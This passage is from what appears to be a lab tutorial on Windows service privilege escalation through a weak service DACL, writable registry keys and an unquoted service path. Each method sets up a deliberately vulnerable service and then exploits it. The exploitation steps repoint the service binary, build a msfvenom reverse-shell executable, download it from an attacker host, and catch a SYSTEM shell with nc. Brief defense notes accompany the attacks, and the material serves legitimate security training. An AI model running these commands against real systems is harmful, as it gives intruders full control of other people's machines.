        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

Noticed how the `BUILTIN\Administrators` groups have all the service permissions with `SERVICE_ALL_ACCESS`. This means that we have full control over the service since the default Windows low-privileged (medium-integrity level) user is in this group by default:

```powershell
C:\Users\user>whoami
desktop-bn\user

C:\Users\user>whoami /groups | findstr /i "builtin\administrators"
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
```

We can enumerate the service access rights from medium-integrity level command prompt or PowerShell console with accesschk:

```powershell
PS C:\Users\user> C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uwcqv user "DACL VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW DACL VulnService
        SERVICE_ALL_ACCESS
 ```

As we can see from the output above, we have the **SERVICE_ALL_ACCESS** access right therefore we can modify the **BINARY_PATH_NAME** value that is used by the service and to do that we can use service control manager to modify the service, this are a few things that we could try:

```powershell
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config <Service_Name> binpath= "net localgroup administrators username /add"

sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config <Service_Name> binpath= "C:\meter443.exe"
```

We'll simply do the following:

```powershell
C:\Users\user>sc config "DACL VulnService" binpath= "\"C:\Tools\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\Users\user>sc qc "DACL VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: DACL VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Tools\reverse.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Note: In the real-world we would use an implant instead.

Generate a reverse shell payload and set up a `http` service:

```shell
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.27.128 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

❯ sudo python3 -m http.server
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.27.129 - - [14/Mar/2022 06:52:21] "GET /reverse.exe HTTP/1.1" 200 -
```

Transfer the payload:

```powershell
PS C:\Tools> wget 192.168.27.128:8000/reverse.exe -O reverse.exe
```

Then in the attacker host, we'll set up a `nc` listener:

```shell
nc -lvnp 443
```

Now we're gonna restart the service:

```powershell
C:\Users\user>net stop "DACL VulnService"
The DACL VulnService service is stopping.
The DACL VulnService service was stopped successfully.


C:\Users\user>net start "DACL VulnService"

# THIS WILL HANG
```

We have received a reverse shell as `NT AUTHORITY\SYSTEM` with `System Integrity Level`:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50645
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

When we disconnect or exit our reverse shell, we'll receive this output in the Windows system:

```powershell
C:\Users\user>net start "DACL VulnService"
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

We're gonna delete this service from an **administrator** command prompt:

```powershell
C:\Tools>sc delete "DACL VulnService"
[SC] DeleteService SUCCESS
```

## Defense

Make sure that the service DACL prevents other users from modifying the service configuration.

# Privilege Escalation via Registry Hives

The Windows registry stores entries for each service. Each registry entry have an ACL attached to them. If the ACL is misconfigured we may be able to modify the service. According to the [official](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) documentation](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) a registry hive is the following:

> A _hive_ is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.

## Configuration

Open an **administrator** command prompt or a PowerShell console as **administrator** and create the directory that we will use for the service path:

```powershell
C:\Windows\system32>md "C:\Program Files\Insecure Registry Service"
```

Copy the service executable file to the path of the service:

```powershell
C:\Windows\system32>copy "C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe" "C:\Program Files\Insecure Registry Service\VulnService.exe"
        1 file(s) copied.
```

Grant full permissions to the executable:

```powershell
C:\Windows\system32>icacls "C:\Program Files\Insecure Registry Service" /grant "Authenticated Users:F"
processed file: C:\Program Files\Insecure Registry Service
Successfully processed 1 files; Failed processing 0 files
```

Create the **insecure registry service** with the SCM:

```powershell
C:\Windows\system32>sc create "Insecure Registry VulnService" binpath= "\"C:\Program Files\Insecure Registry Service\VulnService.exe"" type= own displayname= "Insecure Registry VulnService"
[SC] CreateService SUCCESS

C:\Windows\system32>sc qc "Insecure Registry VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Insecure Registry VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\VulnService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Note: To create a quoted path we must add "\ at the start of the binpath value. Example: "\"C:\Path To\Executablee"" or "\"C:\Path To\Executable"\".
> 
> If we just add a value like "C:\Path To\Executable" then the service will be unquoted.

Set the service access rights:

```powershell
C:\Windows\system32>sc sdset "Insecure Registry VulnService" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
[SC] SetServiceObjectSecurity SUCCESS
```

Add the service to the registry:

```powershell
C:\Tools>echo HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Insecure Registry VulnService [17 1 21 8] > svc.txt

C:\Tools>regini svc.txt
```

Start the service:

```powershell
C:\Windows\system32>sc start "Insecure Registry VulnService"

SERVICE_NAME: Insecure Registry VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4584
        FLAGS              :
```

## Privilege Escalation

Query the Insecure Registry VulnService" service and note that it runs with SYSTEM privileges (`SERVICE_START_NAME`).

```powershell
C:\Users\user>sc qc "Insecure Registry VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Insecure Registry VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\VulnService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Using accesschk.exe we're gonna check which users or groups have access rights to modify the service registry hives:

```powershell
PS C:\Tools> Get-Acl "HKLM:\System\CurrentControlSet\Services\Insecure Registry VulnService" | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\I
         nsecure Registry VulnService
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)

PS C:\Tools> C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -vwqk "HKLM\System\CurrentControlSet\Services\Insecure Registry VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

HKLM\System\CurrentControlSet\Services\Insecure Registry VulnService\Security
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
```

> Note: The `NT AUTHORITY\INTERACTIVE` group have FullControl over the registry keys. This group has all the users that are logged on the system. Also the `BUILTIN\Administrators` have full access to this registry hives.

Check if we can restart the service:

```powershell
PS C:\Users\user> C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -cl "Insecure Registry VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Insecure Registry VulnService
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

PS C:\Users\user> C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -ucqv user "Insecure Registry VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW Insecure Registry VulnService
        SERVICE_ALL_ACCESS

PS C:\Users\user> C:\Tools\SysInternalsSuite\psservice.exe /accepteula security "Insecure Registry VulnService"

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: Insecure Registry VulnService
DISPLAY_NAME: Insecure Registry VulnService
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] Everyone
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Start
                Stop
                Read Permissions
```

Check the current values in the registry entry:

```powershell
PS C:\Users\user> reg query "HKLM\System\CurrentControlSet\Services\Insecure Registry VulnService"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Insecure Registry VulnService
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\VulnService.exe"
    DisplayName    REG_SZ    Insecure Registry VulnService
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Insecure Registry VulnService\Security
```

> Note: We're gonna change the **ImagePath** registry key and as we can see from the **ObjectName** registry key, this service runs as LocalSystem `NT AUTHORITY\SYSTEM`.

Overwrite the **ImagePath** registry key to point to the `reverse.exe` executable we created:

```powershell
PS C:\Users\user> reg add "HKLM\SYSTEM\CurrentControlSet\services\Insecure Registry VulnService" /v ImagePath /t REG_EXPAND_SZ /d C:\Tools\reverse.exe /f
The operation completed successfully.
```

Then in the attacker host, we'll set up a `nc` listener:

```shell
nc -lvnp 443
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```powershell
PS C:\Users\user> net stop "Insecure Registry VulnService"
The Insecure Registry VulnService service is stopping.
The Insecure Registry VulnService service was stopped successfully.

PS C:\Users\user> net start "Insecure Registry VulnService"

```

We have escalated privileges to `NT AUTHORITY\SYSTEM`:

```powershell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50954
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

We're gonna delete this service from an **administrator** command prompt:

```powershell
C:\Tools>sc delete "Insecure Registry VulnService"
[SC] DeleteService SUCCESS
```

## Defense

Make sure that the service registry hives Security permissions that restrict a user from editing it.

# Privilege Escalation via Unquoted Service Path

The Windows system executables can be executed without their extension, e.g., "notepad.exe" can be run by typing "notepad". Additionally, some executables take arguments separated by spaces, e.g., "program.exe arg_1 arg_2". 

Here is an example path:

```powershell
C:\Program Files\Unquoted Path Service\Service.exe
```

This path isn't enclosed with quotes (`" "`) which means that in reality, the Windows system interprets this path as:

```powershell
C:\Program      "Files\Vuln" "Service\Service.exe"
C:\Program.exe  "Argument 1" "Argument 2"
```

The Windows system clarifies the situation by examining each of the options listed above. The problem lies in whether we can write to a directory that Windows checks before the actual executable:

```powershell
C:\Program Files # Writable
C:\Service.exe   # Malicious Executable (Created by the attacker)
```

In summary, this is vulnerable when the path **doesn't have quotes and it has spaces**.

## Configuration

Open an **administrator** command prompt or a PowerShell console as **administrator** and create the directory that we will use for the service path:

```powershell
C:\Tools>md "C:\Program Files\Unquoted Path Service"
```

Copy the service executable file to the path of the service:

```powershell
C:\Tools>copy "C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe" "C:\Program Files\Unquoted Path Service\VulnService.exe"
        1 file(s) copied.

C:\Tools>dir "C:\Program Files\Unquoted Path Service\VulnService.exe"
 Volume in drive C has no label.
 Volume Serial Number is 560A-9A69

 Directory of C:\Program Files\Unquoted Path Service

03/09/2022  12:06 AM             7,168 VulnService.exe
               1 File(s)          7,168 bytes
               0 Dir(s)  55,280,295,936 bytes free
```

Grant full permissions to the executable:

```powershell
C:\Tools>icacls "C:\Program Files\Unquoted Path Service" /grant "Authenticated Users:F"
processed file: C:\Program Files\Unquoted Path Service
Successfully processed 1 files; Failed processing 0 files
```

Create the service with an **unquoted path** with the SCM:

```powershell
C:\Tools>sc create "Unquoted VulnService" binpath= "C:\Program Files\Unquoted Path Service\VulnService.exe" type= own displayname= "Unquoted Path Service"
[SC] CreateService SUCCESS

C:\Tools>sc qc "Unquoted VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Unquoted VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\VulnService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Note: To create a quoted path we must add "\ at the start of the binpath value. Example: "\"C:\Path To\Executablee"" or "\"C:\Path To\Executable"\".
> 
> If we just add a value like "C:\Path To\Executable" then the service will be unquoted.

Set the service access rights:

```powershell
C:\Tools>sc sdset "Unquoted VulnService" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
[SC] SetServiceObjectSecurity SUCCESS
```

Start the service:

```powershell
C:\Tools>sc start "Unquoted VulnService"

SERVICE_NAME: Unquoted VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3740
        FLAGS              :
```

## Privilege Escalation

Let's verify if we have permission to restart the service:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uwcqv user "Unquoted VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW Unquoted VulnService
        SERVICE_ALL_ACCESS
```

There are two main ways that we can see the path of the executable of a service. The first method is by enumerating the **BINARY_PATH_NAME** configuration and the second method is by enumerating the registry key **ImagePath**:

```powershell
C:\Users\user>sc qc "Unquoted VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Unquoted VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\VulnService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user>reg query "HKLM\System\CurrentControlSet\services\Unquoted VulnService"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Unquoted VulnService
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Unquoted Path Service\VulnService.exe
    DisplayName    REG_SZ    Unquoted Path Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Unquoted VulnService\Security

```

We can use wmic to find services and use `findstr` to filter what we want and what we don't want:

```powershell
C:\Users\user>wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
DisplayName                                                                         Name                                      PathName                                                                                                                        StartMode
LSM                                                                                 LSM                                                                                                                                                                       Unknown
NetSetupSvc                                                                         NetSetupSvc                                                                                                                                                               Unknown
Net.Tcp Port Sharing Service                                                        NetTcpPortSharing                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                                   Disabled
Performance Counter DLL Host                                                        PerfHost                                  C:\Windows\SysWow64\perfhost.exe                                                                                                Manual
RemoteMouseService                                                                  RemoteMouseService                        C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe                                                                      Auto
Windows Modules Installer                                                           TrustedInstaller                          C:\Windows\servicing\TrustedInstaller.exe                                                                                       Auto
VulnService                                                                         VulnService                               C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe                                                         Manual
Unquoted Path Service                                                               Unquoted VulnService                      C:\Program Files\Unquoted Path Service\VulnService.exe                                                                          Manual
```

{{< image src="/images/posts/unquoted-path-service.png" caption="Unquoted Path Service " src_s="/images/posts/unquoted-path-service.png" src_l="/images/posts/unquoted-path-service.png" >}}

Alternatively, we can list all the unquoted service paths with PowerShell (minus built-in Windows services):

```bash
PS C:\Tools> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

PathName                                                   DisplayName        Name
--------                                                   -----------        ----
C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe RemoteMouseService RemoteMouseService


PS C:\Tools> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Manual" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

PathName                                                                DisplayName           Name
--------                                                                -----------           ----
C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe VulnService           Vu...
C:\Program Files\Unquoted Path Service\VulnService.exe                  Unquoted Path Service Un...
```

> Note: We may want to change the start mode: StartMode -eq "Manual"

As we can see it is not enclosed with quotes. Let's verify if we can restart the service:

```powershell
C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uvqc "Insecure VulnService Executable"
```

Now we'll need to verify if we have to write permissions in any of these directories:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Unquoted Path Service
  RW NT AUTHORITY\Authenticated Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

```

Stop the service:

```powershell
C:\Users\user>sc stop "Unquoted VulnService"

SERVICE_NAME: Unquoted VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\user>sc qc "Unquoted VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Unquoted VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\VulnService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Since we have write permissions, we can add our executable in this directory:

```powershell
C:\Users\user>copy C:\Tools\reverse.exe "C:\Program Files\Unquoted Path Service\VulnService.exe"
Overwrite C:\Program Files\Unquoted Path Service\VulnService.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

Set up a listener in the attacker host:

```shell
nc -lvnp 443
```

Restart the service:

```powershell
C:\Users\user>net start "Unquoted VulnService"
```

We have received a reverse shell running as `NT AUTHORITY\SYSTEM`:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50714
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

We're gonna delete this service from an **administrator** command prompt:

```powershell
C:\Windows\system32>sc delete "Unquoted VulnService"
[SC] DeleteService SUCCESS
```

## Defense

